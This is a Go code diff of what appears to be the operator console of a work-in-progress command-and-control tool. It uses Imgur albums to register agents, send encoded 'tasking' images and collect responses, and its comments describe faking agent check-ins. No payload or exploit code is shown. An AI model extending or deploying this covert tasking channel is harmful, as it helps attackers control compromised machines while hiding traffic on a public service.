@@ -195,7 +195,8 @@ func main() {
 		// When an album is created, it will create a new agent ID
 
 		// First, let's check that this tracks all albums made...okay it does, great
-
+		// Second, might need to add a status here...or maybe create a new status and assign an agent to an album...done (sort of)
+		// Third, I need to emulate a user checking in...
 		if strings.EqualFold(result, "Album") {
 			// I put this here so that it would initialize this value instantly, but idk if this is the perfect spot
 			if internal.GetClientID() != "" {
@@ -213,9 +214,6 @@ func main() {
 				if strings.TrimRight(text, "\n") == "options" {
 					fmt.Println(" ")
 					fmt.Println(color.YellowString("==[ OPTIONS ]=="))
-
-					// THis did grab the client id from the Picture table which was inserted by simply setting the client-id in the Image module
-					// But if you run go in the image module, it doesn't set the client-id which doesn't make sense, leaving commented out for now
 
 					for key, value := range albumOptions {
 						if value == "" {
@@ -259,8 +257,11 @@ func main() {
 					albumOptions["AlbumID"] = albumID.(string)
 					albumOptions["Album Delete-Hash"] = deletehash.(string)
 
-					// Utilizes the mysql stuff, currently have it set up on a Docker test server
+					// Utilizes the mysql docker instance, which inputs data into Album table
 					internal.InsertAlbum(albumOptions["Title"], albumOptions["AlbumID"], albumOptions["Album Delete-Hash"])
+
+					// Creates an agent
+					internal.CreateAgent(albumOptions["Title"])
 
 				} else if strings.Contains(text, "exit") {
 					break
@@ -271,14 +272,15 @@ func main() {
 		}
 
 		// I have to figure out this part...
-		// we have to figure out how to task a particular album...send an image to an ID with a particular description
+		// I have to figure out how to task a particular album...send an image to an ID with a particular description
 		// Number 1: Either start a new tasking, or choose to task a particular agent
 		// Number 2: When you create an album, it creates a "Waiting status" of a new Task, and then when a client checks in it could change the status in the tasking, and then init a new Agent????? <- Prototype this...
 
+		// Album module creates ID -> ...
 		if strings.EqualFold(result, "Task") {
 			// I put this here so that it would initialize this value instantly, but idk if this is the perfect spot
 			if internal.GetClientID() != "" {
-				taskOptions["Client-ID"] = internal.GetClientID()
+				taskOptions["ClientID"] = internal.GetClientID()
 			}
 			for {
 				reader := bufio.NewReader(os.Stdin)
@@ -356,9 +358,34 @@ func main() {
 					}
 
 				} else if strings.Contains(text, "go") {
-					imageID, deletehash := cmd.UploadImage(taskOptions["TaskingImage"], taskOptions["Title"], taskOptions["AlbumID"], taskOptions["Description"], taskOptions["ClientID"])
-					cmd.AddImage(albumOptions["Album Delete-Hash"], imageOptions["ClientID"], deletehash.(string))
+					// This needs to be updated...
 
+					// What needs to happen is to supply a created album to upload / "task" to
+					// Maybe ask the user "Hey, what album would you like to task?" and show it the list of albums?
+					// Then have the user add it to that album, I still need to make a fake agent
+
+					// I just managed to get a working PoC of grabbing mulitple images from an album: get_album_images.go
+
+					// UploadImage() sends image to public gallery, since it's needs to be up in the public gallery to be added to a specific album
+					imageID, deletehash := cmd.UploadImage(taskOptions["TaskingImage"], taskOptions["Title"], taskOptions["AlbumID"], taskOptions["Description"], taskOptions["ClientID"])
+
+					// Confirmed that this actually does add to the album
+					scanner := bufio.NewScanner(os.Stdin)
+					fmt.Println(" ")
+					fmt.Println(color.YellowString("===[ ALBUMS ]==="))
+					internal.GetAlbums()
+					fmt.Println(" ")
+
+					fmt.Println("[?] Which album would you like to task (Choose delete-hash)?")
+
+					scanner.Scan()
+					taskAlbum := scanner.Text()
+
+					// AddImage() actaully adds the image to a particular album
+					cmd.AddImage(taskAlbum, imageOptions["ClientID"], deletehash.(string))
+
+					// I truly don't know the value of these, why did I add this?
+					// It returns the imageid and hash of the public images.../shrug
 					imgurItems.Put("ImageID", imageID)
 					imgurItems.Put("ImageDeleteHash", deletehash)
 
@@ -432,6 +459,12 @@ func main() {
 					}
 					fmt.Println(" ")
 
+				} else if strings.Contains(text, "set") {
+					if strings.Contains(text, "album-id") {
+						albumid := strings.Split(text, "album-id ")
+						responseOptions["AlbumID"] = strings.Replace(strings.Join(albumid[1:], ""), "\n", "", -1)
+					}
+
 				} else if strings.Contains(text, "check") {
 					albumID := responseOptions["AlbumID"]
 					clientID := responseOptions["ClientID"]
@@ -480,7 +513,7 @@ func main() {
 
 			scanner := bufio.NewScanner(os.Stdin)
 
-			// Create encoded iamge
+			// Create encoded image
 			// **********************************************************************************************************
 
 			// Get client-id from user
@@ -537,8 +570,13 @@ func main() {
 			albumOptions["Album Delete-Hash"] = deletehash.(string)
 
 			fmt.Println("Adding data to the SQL instance...")
+
 			// Utilizes the mysql stuff, currently have it set up on a Docker test server
 			internal.InsertAlbum(albumOptions["Title"], albumOptions["AlbumID"], albumOptions["Album Delete-Hash"])
+
+			// Creates an agent
+			internal.CreateAgent(albumOptions["Title"])
+
 			fmt.Println("[+] All done! Moving on...")
 			time.Sleep(1 * time.Second)
 
@@ -571,7 +609,6 @@ func main() {
 		}
 
 		//TODO:
-		// Add list taskings module []
 		if strings.EqualFold(result, "List") {
 			for {
 				reader := bufio.NewReader(os.Stdin)
@@ -599,6 +636,12 @@ func main() {
 					fmt.Println(" ")
 					fmt.Println(color.YellowString("===[ ALBUMS ]==="))
 					internal.GetAlbums()
+					fmt.Println(" ")
+
+				} else if strings.Contains(text, "list taskings") {
+					fmt.Println(" ")
+					fmt.Println(color.YellowString("===[ TASKINGS ]==="))
+					internal.GetTaskings()
 					fmt.Println(" ")
 
 				} else if strings.Contains(text, "exit") {
